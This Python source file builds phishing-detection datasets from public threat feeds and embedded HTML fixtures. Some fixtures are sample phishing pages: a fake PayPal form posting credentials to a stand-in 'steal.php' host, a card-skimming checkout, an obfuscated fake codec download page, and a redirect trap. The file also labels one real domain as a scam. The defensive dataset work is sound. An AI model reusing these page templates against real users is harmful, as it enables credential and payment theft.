"""
src/build_datasets.py — Multi-Source Dataset Engineering & Validation Pipeline

Integrates verified datasets cleanly without synthetic-label contamination:
1. PhiUSIIL ground-truth URL dataset (with prior synthetic rows stripped cleanly)
2. PhreshPhish (Hugging Face CC-BY-4.0) real HTML + URL + brand target + date dataset
3. OpenPhish active phishing feed + graceful PhishTank / URLhaus adapters
4. Tranco Top-1M benign candidate validation (cross-checked against threat feeds)
5. Curated verified multi-label records & static HTML fixtures (data/external/)

Produces:
  - data/processed/url_dataset.csv (+ domain-grouped url_train/val/test.csv)
  - data/processed/dom_dataset.csv (+ domain-grouped dom_train/val/test.csv + dom_temporal_test.csv)
  - data/processed/combined_dataset.csv
  - data/processed/uncertain_samples.csv (kept strictly separate from verified training data)
"""

from __future__ import annotations

import argparse
from datetime import datetime, timezone
import gzip
import json
import os
import sys
import urllib.error
import urllib.request
from urllib.parse import urlparse

import pandas as pd

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.dataset_validation import (
    domain_grouped_train_val_test_split,
    temporal_train_test_split,
    validate_dataset_schema,
)
from src.dom_features import DOM_FEATURE_COLUMNS, extract_dom_features_from_html
from src.features import (
    TRUSTED_DOMAINS,
    URL_FEATURE_COLUMNS,
    extract_root_domain,
    extract_url_features,
    normalize_url,
)

RAW_DIR = os.path.join("data", "raw")
EXTERNAL_DIR = os.path.join("data", "external")
PROCESSED_DIR = os.path.join("data", "processed")

PHIUSIIL_PATH = os.path.join("dataset", "PhiUSIIL_Phishing_URL_Dataset.csv")
TRANCO_GZ_PATH = os.path.join("dataset", "tranco_top1m.json.gz")
PHRESHPHISH_CACHE_PATH = os.path.join(RAW_DIR, "phreshphish_sample.json.gz")
CUSTOM_VERIFIED_PATH = os.path.join(EXTERNAL_DIR, "custom_verified.csv")

SYNTHETIC_PREFIXES = (
    "valid-site-",
    "verify-login-",
    "valid-shop-",
    "scam-shop-",
    "synth-valid-",
    "synth-phish-",
    "synth-shop-",
    "synth-scam-",
)


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _http_get_json(url: str, timeout: float = 15.0) -> dict:
    req = urllib.request.Request(url, headers={"User-Agent": "PhishGuard-DatasetBuilder/2.0"})
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


def _http_get_lines(url: str, headers: dict | None = None, timeout: float = 15.0) -> list[str]:
    hdrs = {"User-Agent": "PhishGuard-DatasetBuilder/2.0"}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, headers=hdrs)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        raw = resp.read()
        if url.endswith(".gz") or "gzip" in (resp.headers.get("Content-Encoding") or "").lower():
            raw = gzip.decompress(raw)
        return [l.strip() for l in raw.decode("utf-8", errors="ignore").splitlines() if l.strip() and not l.startswith("#")]


def ensure_custom_verified_fixtures() -> tuple[pd.DataFrame, list[dict]]:
    """
    Create and load verified multi-label records & static HTML fixtures covering:
    fake e-commerce/payment traps, brand impersonation, credential harvesting,
    deceptive redirects, suspicious downloads, benign HTTP pages, and legitimate portals.
    (Never fetches live malicious URLs during fixture loading.)
    """
    os.makedirs(EXTERNAL_DIR, exist_ok=True)
    fixtures: list[dict] = [
        # 1. Legitimate HTTP informational page (tests Rule 9: HTTP != phishing)
        {
            "url": "http://info-archive.example.org/docs/guide.html",
            "primary_label": "benign",
            "risk_labels": "benign",
            "binary_label": 1,
            "confidence": 1.0,
            "evidence": "Static informational page over HTTP with zero credential/payment traps.",
            "html": (
                "<html><head><title>Info Archive Documentation Guide</title></head>"
                "<body><h1>Network Standards Reference</h1><p>Public specification guide.</p>"
                "<a href='/docs/intro.html'>Intro</a><a href='/docs/faq.html'>FAQ</a>"
                "<footer>Copyright 2026 Info Archive</footer></body></html>"
            ),
        },
        # 2. Legitimate ad-heavy news/blog site (tests Rule 10: ads != malware)
        {
            "url": "https://techdaily-journal.example.com/articles/cloud-security",
            "primary_label": "benign",
            "risk_labels": "benign",
            "binary_label": 1,
            "confidence": 1.0,
            "evidence": "Legitimate publisher page with third-party analytics/ad scripts and normal links.",
            "html": (
                "<html><head><title>TechDaily Journal - Cloud Security Trends</title>"
                "<script src='https://cdn.adnetwork.example.net/ads.js'></script>"
                "<script src='https://analytics.example.net/tag.js'></script></head>"
                "<body><article><h1>Cloud Security 2026</h1><p>Editorial analysis.</p></article>"
                "<iframe src='https://ads.example.net/banner' width='300' height='250'></iframe>"
                "<a href='/about'>About</a><a href='/privacy'>Privacy</a>"
                "<footer>Copyright TechDaily Journal | editorial@techdaily-journal.example.com</footer></body></html>"
            ),
        },
        # 3. Legitimate first-party HTTPS login & checkout portal
        {
            "url": "https://shop.aurora-goods.example.com/account/login",
            "primary_label": "benign",
            "risk_labels": "benign",
            "binary_label": 1,
            "confidence": 1.0,
            "evidence": "First-party HTTPS login form submitting to own domain with matching title.",
            "html": (
                "<html><head><title>Aurora Goods - Sign In</title></head>"
                "<body><form method='post' action='/account/auth'>"
                "<input type='email' name='email'/><input type='password' name='password'/>"
                "<button type='submit'>Sign In</button></form>"
                "<a href='/refund-policy'>Refund Policy</a><a href='/contact'>Contact</a>"
                "<footer>support@aurora-goods.example.com | Copyright Aurora Goods</footer></body></html>"
            ),
        },
        # 4. Credential harvesting (external cross-domain POST + brand impersonation)
        {
            "url": "https://secure-paypal-verify-login.example.xyz/auth",
            "primary_label": "phishing",
            "risk_labels": "phishing|brand_impersonation|credential_risk",
            "binary_label": 0,
            "confidence": 1.0,
            "evidence": "External credential POST destination + PayPal brand impersonation.",
            "html": (
                "<html><head><title>PayPal Security Account Verification</title></head>"
                "<body><form method='post' action='https://collect-creds.evil.example.top/steal.php'>"
                "<input type='hidden' name='s1' value='1'/><input type='hidden' name='s2' value='2'/>"
                "<input type='hidden' name='s3' value='3'/><input type='email' name='email'/>"
                "<input type='password' name='pass'/><button type='submit'>Verify Immediately</button></form>"
                "<a href='#'>Help</a><a href='#'>Privacy</a></body></html>"
            ),
        },
        # 5. Fake e-commerce / upfront-payment scam store (HTML fixture)
        {
            "url": "https://flipkart-mega-flash-deals.example.shop/checkout",
            "primary_label": "payment_risk",
            "risk_labels": "payment_risk|brand_impersonation|deceptive_behavior",
            "binary_label": 0,
            "confidence": 1.0,
            "evidence": "Brand lookalike storefront with prepaid UPI trap, store-credit refund only, dummy links.",
            "html": (
                "<html><head><title>Flipkart Mega Deals 90% Off Checkout</title></head>"
                "<body><h1>Deal ends in 02:14 - Only 2 left!</h1>"
                "<p>Pay now via UPI / Razorpay. All sales final sale, no refund, store credit only.</p>"
                "<form method='post' action='https://external-pay-skimmer.example.icu/pay'>"
                "<input type='text' name='card_number'/><input type='text' name='cvv'/>"
                "<button type='submit'>Claim Now</button></form>"
                "<a href='#'>Terms</a><a href='#'>Refund</a><a href='javascript:void(0)'>Contact</a></body></html>"
            ),
        },
        # 6. Malware distribution & fake download buttons + obfuscated JS
        {
            "url": "https://free-codec-player-update.example.top/download",
            "primary_label": "malware_distribution",
            "risk_labels": "malware_distribution|deceptive_behavior",
            "binary_label": 0,
            "confidence": 1.0,
            "evidence": "Fake download CTA linking to executable + eval/atob dynamic script injection.",
            "html": (
                "<html><head><title>Critical Codec Update Required</title>"
                "<script>var x=eval(atob('YWxlcnQoMSk='));document.write('<iframe src=\"http://bad.example/x\"></iframe>');"
                "var s=document.createElement('script');window.open('https://popup.example.xyz/ad');</script></head>"
                "<body><a href='https://cdn-dropper.example.xyz/CodecSetup.exe'>Click to Download Free Download</a>"
                "<button>Start Download</button></body></html>"
            ),
        },
        # 7. Deceptive redirect chain & hidden iframe trap
        {
            "url": "https://reward-claim-portal.example.buzz/redirect",
            "primary_label": "suspicious_redirect",
            "risk_labels": "suspicious_redirect|deceptive_behavior|phishing",
            "binary_label": 0,
            "confidence": 1.0,
            "evidence": "Meta refresh redirect + JS location redirect + hidden zero-size iframe.",
            "html": (
                "<html><head><title>Congratulations You Won</title>"
                "<meta http-equiv='refresh' content='1;url=https://harvest.example.cfd/step2'/>"
                "<script>window.location.href='https://harvest.example.cfd/step2';Notification.requestPermission();</script></head>"
                "<body><iframe src='https://tracker.example.icu/pixel' style='display:none' width='0' height='0'></iframe>"
                "<button>Claim Now</button></body></html>"
            ),
        },
    ]

    # Also write/refresh custom verified CSV with documented upfront-payment scam sites
    rows = []
    ts = _now_iso()
    for fx in fixtures:
        u = normalize_url(fx["url"])
        h = (urlparse(u).hostname or "").lower()
        rows.append({
            "url": u,
            "domain": h,
            "root_domain": extract_root_domain(h),
            "source": "custom_verified_fixture",
            "collection_timestamp": ts,
            "verification_status": "verified",
            "html_available": True,
            "primary_label": fx["primary_label"],
            "risk_labels": fx["risk_labels"],
            "binary_label": fx["binary_label"],
            "confidence": fx["confidence"],
            "evidence": fx["evidence"],
            "date": ts[:10],
        })

    # Real documented non-delivery / upfront-payment scam domain (URL-level verified record; no live scraping)
    rows.append({
        "url": "https://vlebazaar.in/",
        "domain": "vlebazaar.in",
        "root_domain": "vlebazaar.in",
        "source": "verified_consumer_fraud_registry",
        "collection_timestamp": ts,
        "verification_status": "verified",
        "html_available": False,
        "primary_label": "payment_risk",
        "risk_labels": "payment_risk|deceptive_behavior",
        "binary_label": 0,
        "confidence": 0.95,
        "evidence": "Extensive consumer non-delivery complaints on prepaid orders; store-credit refund trap & missing corporate email.",
        "date": ts[:10],
    })
    df_custom = pd.DataFrame(rows)
    df_custom.to_csv(CUSTOM_VERIFIED_PATH, index=False)
    return df_custom, fixtures


def fetch_phreshphish_sample(max_per_class: int = 350, refresh: bool = False) -> pd.DataFrame:
    """
    Fetch real benign & phishing HTML-URL samples (with dates & brand targets)
    from PhreshPhish on Hugging Face Datasets Server (CC-BY-4.0).
    """
    os.makedirs(RAW_DIR, exist_ok=True)
    if os.path.exists(PHRESHPHISH_CACHE_PATH) and not refresh:
        with gzip.open(PHRESHPHISH_CACHE_PATH, "rt", encoding="utf-8") as gz:
            cached = json.load(gz)
        if cached:
            print(f"Loaded {len(cached)} cached PhreshPhish samples from {PHRESHPHISH_CACHE_PATH}")
            return pd.DataFrame(cached)

    print("Fetching PhreshPhish HTML+URL samples from Hugging Face Datasets Server...")
    collected: list[dict] = []
    benign_cnt, phish_cnt = 0, 0
    for split_name in ("train", "test"):
        offset = 0
        while (benign_cnt < max_per_class or phish_cnt < max_per_class) and offset < 5000:
            api_url = (
                f"https://datasets-server.huggingface.co/rows?"
                f"dataset=phreshphish%2Fphreshphish&config=default&split={split_name}&offset={offset}&length=100"
            )
            try:
                data = _http_get_json(api_url, timeout=20.0)
                rows = data.get("rows", [])
                if not rows:
                    break
                for item in rows:
                    r = item.get("row", {})
                    lbl = str(r.get("label") or "").lower().strip()
                    html = r.get("html") or ""
                    url = r.get("url") or ""
                    if not url or len(html) < 150:
                        continue
                    if lbl == "benign" and benign_cnt < max_per_class:
                        benign_cnt += 1
                        collected.append({
                            "url": url,
                            "label": "benign",
                            "target": r.get("target"),
                            "date": r.get("date"),
                            "html": html[:250_000],
                            "split_origin": split_name,
                        })
                    elif lbl in ("phish", "phishing") and phish_cnt < max_per_class:
                        phish_cnt += 1
                        collected.append({
                            "url": url,
                            "label": "phishing",
                            "target": r.get("target"),
                            "date": r.get("date"),
                            "html": html[:250_000],
                            "split_origin": split_name,
                        })
                offset += 100
            except Exception as e:
                print(f"  [WARN] PhreshPhish fetch paused at split={split_name} offset={offset}: {e}")
                break

    if collected:
        with gzip.open(PHRESHPHISH_CACHE_PATH, "wt", encoding="utf-8") as gz:
            json.dump(collected, gz)
        print(f"Saved {len(collected)} PhreshPhish samples (benign={benign_cnt}, phish={phish_cnt}) -> {PHRESHPHISH_CACHE_PATH}")
    return pd.DataFrame(collected)


def fetch_external_threat_and_benign_feeds(limit_openphish: int = 300, limit_tranco: int = 500) -> tuple[pd.DataFrame, pd.DataFrame]:
    """
    Fetch OpenPhish, graceful optional PhishTank / URLhaus (if keys provided), and Tranco candidates.
    Tranco domains are treated carefully: known vetted trusted domains -> verified benign;
    unvetted Tranco domains -> separated into uncertain_samples.csv!
    """
    ts = _now_iso()
    verified_rows: list[dict] = []
    uncertain_rows: list[dict] = []

    # 1. OpenPhish
    openphish_hosts: set[str] = set()
    try:
        op_urls = _http_get_lines("https://openphish.com/feed.txt", timeout=12.0)[:limit_openphish]
        for u in op_urls:
            nu = normalize_url(u)
            h = (urlparse(nu).hostname or "").lower()
            if not h:
                continue
            openphish_hosts.add(extract_root_domain(h))
            verified_rows.append({
                "url": nu,
                "domain": h,
                "root_domain": extract_root_domain(h),
                "source": "openphish",
                "collection_timestamp": ts,
                "verification_status": "verified",
                "html_available": False,
                "primary_label": "phishing",
                "risk_labels": "phishing|credential_risk",
                "binary_label": 0,
                "confidence": 0.95,
                "evidence": "Listed in active OpenPhish verified phishing feed.",
                "date": ts[:10],
            })
        print(f"OpenPhish: {len(verified_rows)} verified URLs")
    except Exception as e:
        print(f"[WARN] OpenPhish unavailable: {e}")

    # 2. Optional URLhaus (requires URLHAUS_AUTH_KEY on v2 exports; fails gracefully)
    uh_key = (os.getenv("URLHAUS_AUTH_KEY") or "").strip()
    if uh_key:
        try:
            uh_lines = _http_get_lines(f"https://urlhaus-api.abuse.ch/v2/files/exports/{uh_key}/recent.csv", timeout=15.0)
            added_uh = 0
            for ln in uh_lines:
                if "," not in ln:
                    continue
                parts = [p.strip('"') for p in ln.split(",")]
                if len(parts) > 2 and parts[2].startswith("http"):
                    nu = normalize_url(parts[2])
                    h = (urlparse(nu).hostname or "").lower()
                    verified_rows.append({
                        "url": nu, "domain": h, "root_domain": extract_root_domain(h),
                        "source": "urlhaus", "collection_timestamp": ts,
                        "verification_status": "verified", "html_available": False,
                        "primary_label": "malware_distribution", "risk_labels": "malware_distribution",
                        "binary_label": 0, "confidence": 0.95,
                        "evidence": "Active malware distribution URL from abuse.ch URLhaus.",
                        "date": ts[:10],
                    })
                    added_uh += 1
                    if added_uh >= 300:
                        break
            print(f"URLhaus: {added_uh} verified malware URLs")
        except Exception as e:
            print(f"[WARN] URLhaus unavailable: {e}")
    else:
        print("URLhaus auth key not configured (URLHAUS_AUTH_KEY); skipping live export gracefully.")

    # 3. Optional PhishTank (respects rate limits; uses PHISHTANK_API_KEY if set)
    pt_key = (os.getenv("PHISHTANK_API_KEY") or "").strip()
    if pt_key:
        try:
            pt_url = f"https://data.phishtank.com/data/{pt_key}/online-valid.csv.gz"
            pt_lines = _http_get_lines(pt_url, headers={"User-Agent": "phishtank/phishguard-research"}, timeout=15.0)
            added_pt = 0
            for ln in pt_lines[1:]:
                parts = ln.split(",")
                if len(parts) >= 2 and parts[1].startswith("http"):
                    nu = normalize_url(parts[1])
                    h = (urlparse(nu).hostname or "").lower()
                    verified_rows.append({
                        "url": nu, "domain": h, "root_domain": extract_root_domain(h),
                        "source": "phishtank", "collection_timestamp": ts,
                        "verification_status": "verified", "html_available": False,
                        "primary_label": "phishing", "risk_labels": "phishing",
                        "binary_label": 0, "confidence": 0.95,
                        "evidence": "Verified online phishing submission in PhishTank.",
                        "date": ts[:10],
                    })
                    added_pt += 1
                    if added_pt >= 300:
                        break
            print(f"PhishTank: {added_pt} verified URLs")
        except Exception as e:
            print(f"[WARN] PhishTank unavailable or rate-limited: {e}")
    else:
        print("PhishTank key not set (PHISHTANK_API_KEY); skipping bulk download to respect rate limits.")

    # 4. Tranco candidates (only vetted TRUSTED_DOMAINS become verified benign; others go to uncertain_samples)
    if os.path.exists(TRANCO_GZ_PATH):
        with gzip.open(TRANCO_GZ_PATH, "rt", encoding="utf-8") as gz:
            tranco = json.load(gz)
        sorted_doms = sorted(tranco.items(), key=lambda kv: kv[1])[:limit_tranco]
        for dom, rank in sorted_doms:
            root = extract_root_domain(dom)
            if root in openphish_hosts:
                continue
            nu = f"https://{dom}/"
            if root in TRUSTED_DOMAINS:
                verified_rows.append({
                    "url": nu, "domain": dom, "root_domain": root,
                    "source": "tranco_vetted", "collection_timestamp": ts,
                    "verification_status": "verified", "html_available": False,
                    "primary_label": "benign", "risk_labels": "benign",
                    "binary_label": 1, "confidence": 0.95,
                    "evidence": f"Vetted established domain (Tranco rank #{rank}).",
                    "date": ts[:10],
                })
            else:
                uncertain_rows.append({
                    "url": nu, "domain": dom, "root_domain": root,
                    "source": "tranco_unvetted_candidate", "collection_timestamp": ts,
                    "verification_status": "uncertain", "html_available": False,
                    "primary_label": "unknown", "risk_labels": "unknown",
                    "binary_label": -1, "confidence": 0.50,
                    "evidence": f"Tranco rank #{rank} candidate; requires verification before training use.",
                    "date": ts[:10],
                })

    return pd.DataFrame(verified_rows), pd.DataFrame(uncertain_rows)


def build_all_datasets(max_phiusiil: int = 60000, max_phreshphish_per_class: int = 350, refresh_phreshphish: bool = False) -> dict:
    """Build separated URL, DOM, combined, and uncertain datasets under data/processed/."""
    os.makedirs(RAW_DIR, exist_ok=True)
    os.makedirs(EXTERNAL_DIR, exist_ok=True)
    os.makedirs(PROCESSED_DIR, exist_ok=True)
    ts = _now_iso()

    custom_df, html_fixtures = ensure_custom_verified_fixtures()
    phresh_df = fetch_phreshphish_sample(max_per_class=max_phreshphish_per_class, refresh=refresh_phreshphish)
    feeds_df, uncertain_df = fetch_external_threat_and_benign_feeds()

    # 1. Load genuine PhiUSIIL records ONLY (strip synthetic rows so ground truth is clean)
    phi_records: list[dict] = []
    if os.path.exists(PHIUSIIL_PATH):
        raw_phi = pd.read_csv(PHIUSIIL_PATH)
        raw_phi = raw_phi[~raw_phi["Domain"].astype(str).str.startswith(SYNTHETIC_PREFIXES)].copy()
        raw_phi = raw_phi.drop_duplicates(subset=["URL"], keep="first")
        # Group cap per domain to prevent massive domain skew
        raw_phi["root_domain"] = raw_phi["Domain"].astype(str).map(extract_root_domain)
        raw_phi = raw_phi.groupby("root_domain", group_keys=False).head(2)
        if len(raw_phi) > max_phiusiil:
            # Balanced stratified sample across label 0 and 1
            n_half = max_phiusiil // 2
            p0 = raw_phi[raw_phi["label"] == 0].sample(n=min(n_half, int((raw_phi["label"] == 0).sum())), random_state=42)
            p1 = raw_phi[raw_phi["label"] == 1].sample(n=min(n_half, int((raw_phi["label"] == 1).sum())), random_state=42)
            raw_phi = pd.concat([p0, p1], ignore_index=True)

        for _, row in raw_phi.iterrows():
            nu = normalize_url(str(row["URL"]))
            dom = str(row["Domain"]).lower().strip()
            lbl = int(row["label"])
            primary = "benign" if lbl == 1 else "phishing"
            phi_records.append({
                "url": nu,
                "domain": dom,
                "root_domain": extract_root_domain(dom),
                "source": "phiusiil",
                "collection_timestamp": ts,
                "verification_status": "verified",
                "html_available": False,
                "primary_label": primary,
                "risk_labels": primary,
                "binary_label": lbl,
                "confidence": 1.0,
                "evidence": "Verified ground-truth record from PhiUSIIL Phishing URL Dataset.",
                "date": "2024-01-01",
            })
    phi_meta_df = pd.DataFrame(phi_records)

    # 2. Build DOM dataset from PhreshPhish HTML + verified static HTML fixtures
    dom_rows: list[dict] = []
    phresh_meta_rows: list[dict] = []

    for fx in html_fixtures:
        nu = normalize_url(fx["url"])
        h = (urlparse(nu).hostname or "").lower()
        dom_feats = extract_dom_features_from_html(nu, fx["html"])
        dom_feats.pop("unavailable_signals", None)
        dom_feats.update({
            "url": nu,
            "domain": h,
            "root_domain": extract_root_domain(h),
            "source": "custom_verified_fixture",
            "primary_label": fx["primary_label"],
            "risk_labels": fx["risk_labels"],
            "binary_label": fx["binary_label"],
            "date": ts[:10],
        })
        dom_rows.append(dom_feats)

    if not phresh_df.empty:
        phresh_df = phresh_df.copy()
        # Cap repeated hosting domains (e.g., gitbook.io/webflow.io templates) so no single provider dominates a split
        phresh_df["_root"] = phresh_df["url"].map(
            lambda u: extract_root_domain(urlparse(normalize_url(str(u))).hostname or "")
        )
        phresh_df = phresh_df.groupby("_root", group_keys=False).head(3).drop(columns=["_root"]).reset_index(drop=True)
        for _, pr in phresh_df.iterrows():
            nu = normalize_url(str(pr["url"]))
            h = (urlparse(nu).hostname or "").lower()
            root = extract_root_domain(h)
            is_benign = str(pr["label"]).lower() == "benign"
            primary = "benign" if is_benign else "phishing"
            target_brand = pr.get("target")
            risks = ["benign"] if is_benign else ["phishing"]
            if not is_benign and target_brand and str(target_brand).lower() != "none":
                risks.append("brand_impersonation")
            dom_feats = extract_dom_features_from_html(nu, str(pr["html"]))
            dom_feats.pop("unavailable_signals", None)
            dom_feats.update({
                "url": nu,
                "domain": h,
                "root_domain": root,
                "source": "phreshphish",
                "primary_label": primary,
                "risk_labels": "|".join(risks),
                "binary_label": 1 if is_benign else 0,
                "date": str(pr.get("date") or ts[:10])[:10],
            })
            dom_rows.append(dom_feats)
            phresh_meta_rows.append({
                "url": nu,
                "domain": h,
                "root_domain": root,
                "source": "phreshphish",
                "collection_timestamp": ts,
                "verification_status": "verified",
                "html_available": True,
                "primary_label": primary,
                "risk_labels": "|".join(risks),
                "binary_label": 1 if is_benign else 0,
                "confidence": 0.98,
                "evidence": f"PhreshPhish verified {primary} HTML sample" + (f" targeting {target_brand}" if target_brand else ""),
                "date": str(pr.get("date") or ts[:10])[:10],
            })

    dom_dataset = pd.DataFrame(dom_rows).drop_duplicates(subset=["url"], keep="first").reset_index(drop=True)
    validate_dataset_schema(dom_dataset, DOM_FEATURE_COLUMNS + ["url", "root_domain", "binary_label", "primary_label"])
    dom_path = os.path.join(PROCESSED_DIR, "dom_dataset.csv")
    dom_dataset.to_csv(dom_path, index=False)

    # Domain-grouped train/val/test split for DOM model + temporal split on PhreshPhish
    dom_train, dom_val, dom_test = domain_grouped_train_val_test_split(dom_dataset, group_col="root_domain")
    dom_train.to_csv(os.path.join(PROCESSED_DIR, "dom_train.csv"), index=False)
    dom_val.to_csv(os.path.join(PROCESSED_DIR, "dom_val.csv"), index=False)
    dom_test.to_csv(os.path.join(PROCESSED_DIR, "dom_test.csv"), index=False)

    phresh_only_dom = dom_dataset[dom_dataset["source"] == "phreshphish"]
    if len(phresh_only_dom) >= 40:
        _, dom_temp_test = temporal_train_test_split(phresh_only_dom, date_col="date", test_fraction=0.25)
        dom_temp_test.to_csv(os.path.join(PROCESSED_DIR, "dom_temporal_test.csv"), index=False)

    # 3. Combine verified metadata -> extract pure URL features -> save url_dataset.csv & combined_dataset.csv
    phresh_meta_df = pd.DataFrame(phresh_meta_rows)
    combined_df = pd.concat([custom_df, phresh_meta_df, feeds_df, phi_meta_df], ignore_index=True)
    combined_df = combined_df.drop_duplicates(subset=["url"], keep="first").reset_index(drop=True)
    validate_dataset_schema(combined_df, ["url", "domain", "root_domain", "source", "verification_status", "primary_label", "binary_label"])
    combined_df.to_csv(os.path.join(PROCESSED_DIR, "combined_dataset.csv"), index=False)

    if not uncertain_df.empty:
        uncertain_df.drop_duplicates(subset=["url"], keep="first").to_csv(
            os.path.join(PROCESSED_DIR, "uncertain_samples.csv"), index=False
        )

    print(f"Extracting separated URL features for {len(combined_df):,} verified URLs...")
    url_feats_list = [extract_url_features(u) for u in combined_df["url"]]
    url_feats_df = pd.DataFrame(url_feats_list)
    url_dataset = pd.concat(
        [
            url_feats_df[URL_FEATURE_COLUMNS],
            combined_df[["url", "domain", "root_domain", "source", "primary_label", "risk_labels", "binary_label", "date"]],
        ],
        axis=1,
    )
    validate_dataset_schema(url_dataset, URL_FEATURE_COLUMNS + ["url", "root_domain", "binary_label", "primary_label"])
    url_dataset.to_csv(os.path.join(PROCESSED_DIR, "url_dataset.csv"), index=False)

    url_train, url_val, url_test = domain_grouped_train_val_test_split(url_dataset, group_col="root_domain")
    url_train.to_csv(os.path.join(PROCESSED_DIR, "url_train.csv"), index=False)
    url_val.to_csv(os.path.join(PROCESSED_DIR, "url_val.csv"), index=False)
    url_test.to_csv(os.path.join(PROCESSED_DIR, "url_test.csv"), index=False)

    summary = {
        "combined_rows": int(len(combined_df)),
        "url_dataset_rows": int(len(url_dataset)),
        "url_train_rows": int(len(url_train)),
        "url_val_rows": int(len(url_val)),
        "url_test_rows": int(len(url_test)),
        "dom_dataset_rows": int(len(dom_dataset)),
        "dom_train_rows": int(len(dom_train)),
        "dom_val_rows": int(len(dom_val)),
        "dom_test_rows": int(len(dom_test)),
        "uncertain_rows": int(len(uncertain_df)),
        "sources": combined_df["source"].value_counts().to_dict(),
    }
    print("Dataset Engineering Summary:", json.dumps(summary, indent=2))
    return summary


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Build separated, domain-grouped multi-source security datasets.")
    parser.add_argument("--max-phiusiil", type=int, default=60000, help="Max PhiUSIIL ground-truth rows to include.")
    parser.add_argument("--max-phreshphish", type=int, default=350, help="Max PhreshPhish rows per class.")
    parser.add_argument("--refresh-phreshphish", action="store_true", help="Force re-fetch PhreshPhish cache.")
    args = parser.parse_args()
    build_all_datasets(
        max_phiusiil=args.max_phiusiil,
        max_phreshphish_per_class=args.max_phreshphish,
        refresh_phreshphish=args.refresh_phreshphish,
    )

